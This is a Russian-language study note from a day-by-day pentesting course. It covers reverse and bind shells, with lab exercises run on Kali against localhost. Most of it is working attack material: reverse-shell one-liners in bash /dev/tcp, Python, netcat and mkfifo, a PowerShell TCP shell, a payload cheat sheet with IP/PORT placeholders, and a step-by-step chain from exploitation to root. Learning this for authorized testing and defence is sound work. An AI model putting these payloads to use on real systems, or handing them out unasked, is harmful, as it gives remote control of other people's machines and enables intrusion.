# День 18 — Reverse Shells & Bind Shells
**Дата:** 2026-05-14
**Платформа:** Kali Linux (два терминала)

---

## Что такое Shell и зачем он нужен?

```
Веб-шелл (День 12) = управление через браузер
  - неудобно
  - нет автодополнения
  - нельзя запускать интерактивные программы

Reverse/Bind Shell = полноценный терминал удалённой машины
  - как будто сидишь прямо за компьютером жертвы
  - все команды работают
  - можно делать PrivEsc
```

---

## Bind Shell vs Reverse Shell

### Bind Shell:
```
Жертва открывает порт и ЖДЁТ подключения.
Ты подключаешься к жертве.

Жертва:    nc -lvnp 5555 -e /bin/bash  (слушает)
Атакующий: nc ЖЕРТВА_IP 5555           (подключается)

Проблема: Firewall блокирует ВХОДЯЩИЕ соединения к жертве.
Ты не можешь подключиться снаружи.
```

### Reverse Shell:
```
Ты открываешь порт и ЖДЁШЬ.
Жертва сама подключается к тебе.

Атакующий: nc -lvnp 4444                           (слушает)
Жертва:    bash -i >& /dev/tcp/ТВОЙ_IP/4444 0>&1   (звонит)

Почему лучше: Firewall разрешает ИСХОДЯЩИЕ соединения.
Жертва "звонит" тебе — firewall думает это норма.
```

### Аналогия:
```
Bind Shell:
  Жертва оставляет телефон включённым → ты звонишь ей
  ❌ Охрана (firewall) не пускает чужих

Reverse Shell:
  Ты оставляешь телефон включённым → жертва звонит тебе
  ✅ Охрана не мешает — жертва сама позвонила
```

---

## Netcat — главный инструмент

```bash
# Запустить listener (ждать соединения)
nc -lvnp 4444

# Флаги:
# -l = listen (слушать)
# -v = verbose (подробный вывод)
# -n = no DNS (не резолвить имена)
# -p = port (порт)

# Подключиться к хосту
nc 192.168.1.1 4444
```

---

## Практика — Reverse Shell

### Шаг 1 — Терминал 1 (атакующий слушает):
```bash
nc -lvnp 4444
```

### Шаг 2 — Терминал 2 (жертва звонит):
```bash
# Bash reverse shell
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
```

### Результат в Терминале 1:
```
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43532
whoami → kali
id     → uid=1000(kali) groups=...
pwd    → /home/kali/Desktop
```

### Разбор payload:
```bash
bash -i              # интерактивный bash
>& /dev/tcp/IP/PORT  # перенаправить вывод в сеть
0>&1                 # перенаправить ввод туда же

# /dev/tcp — встроен в bash (не работает в zsh!)
# Если zsh → используй: bash -c 'bash -i >& ...'
```

---

## Практика — Bind Shell

### Шаг 1 — Терминал 1 (жертва слушает):
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 5555 > /tmp/f
```

### Шаг 2 — Терминал 2 (атакующий подключается):
```bash
nc 127.0.0.1 5555
```

### Результат:
```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59040
# Пишешь команды в Терминале 2 → ответы в Терминале 1
```

### Почему mkfifo а не -e?
```
nc -e /bin/bash → не работает в большинстве версий Kali
mkfifo создаёт именованный канал (pipe):
  cat /tmp/f     = читает команды из pipe
  | /bin/bash -i = выполняет их в bash
  | nc ...       = отправляет результат через сеть
  > /tmp/f       = записывает обратно в pipe
```

---

## Практика — Python Reverse Shell

### Терминал 1 (listener):
```bash
nc -lvnp 4444
```

### Терминал 2 (Python payload):
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### Разбор Python payload:
```python
import socket, subprocess, os

s = socket.socket()           # создаём сокет
s.connect(("IP", 4444))       # звоним атакующему

os.dup2(s.fileno(), 0)        # stdin  → сокет
os.dup2(s.fileno(), 1)        # stdout → сокет
os.dup2(s.fileno(), 2)        # stderr → сокет

subprocess.call(["/bin/bash", "-i"])  # запускаем bash
```

### Зачем Python если есть Bash?
```
На Windows → нет bash
На ограниченных Linux → нет /dev/tcp
IoT устройства → нет bash
Веб-серверы → Python почти везде

Python shell = универсальный вариант!
```

---

## Правило которое надо запомнить:

```
Кто СЛУШАЕТ — запускается ПЕРВЫМ
Кто ПОДКЛЮЧАЕТСЯ — запускается ВТОРЫМ

Reverse Shell:
  1. Атакующий: nc -lvnp 4444        (слушает первым)
  2. Жертва:    bash -i >& ...        (подключается)

Bind Shell:
  1. Жертва:    nc -lvnp 5555 ...    (слушает первым)
  2. Атакующий: nc IP 5555           (подключается)
```

---

## Виды Shell payloads (шпаргалка):

```bash
# Bash
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat (если поддерживает -e)
nc -e /bin/bash IP PORT

# Netcat (mkfifo — универсальный)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc IP PORT > /tmp/f

# PowerShell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([Text.Encoding]::ASCII.GetBytes($r),0,$r.Length)}"
```

---

## Полная схема атаки в реальном пентесте:

```
Шаг 1: Находим уязвимость (SQLi, RCE, веб-шелл)

Шаг 2: Запускаем listener на нашей машине
        nc -lvnp 4444

Шаг 3: Через уязвимость выполняем payload на жертве
        bash -c 'bash -i >& /dev/tcp/НАШ_IP/4444 0>&1'

Шаг 4: Получаем shell
        connect to [НАШ_IP] from (UNKNOWN) [ЖЕРТВА_IP]
        whoami → www-data

Шаг 5: PrivEsc (Дни 16-17) → root
        sudo su - / LinPEAS / SUID
```

---

## Итоговая таблица

| Тип | Где слушает | Кто подключается | Команда |
|-----|------------|-----------------|---------|
| Reverse Shell | Атакующий | Жертва | `bash -i >& /dev/tcp/IP/PORT` |
| Bind Shell | Жертва | Атакующий | `nc -lvnp PORT -e /bin/bash` |
| Python Shell | Атакующий | Жертва | `python3 -c 'import socket...'` |

---

## Инструменты дня

| Инструмент | Команда | Что делает |
|-----------|---------|------------|
| netcat listener | `nc -lvnp 4444` | ждёт входящего shell |
| bash reverse | `bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'` | reverse shell |
| mkfifo bind | `mkfifo /tmp/f; cat /tmp/f \| bash \| nc -lvnp 5555` | bind shell |
| python3 shell | `python3 -c 'import socket...'` | python reverse shell |
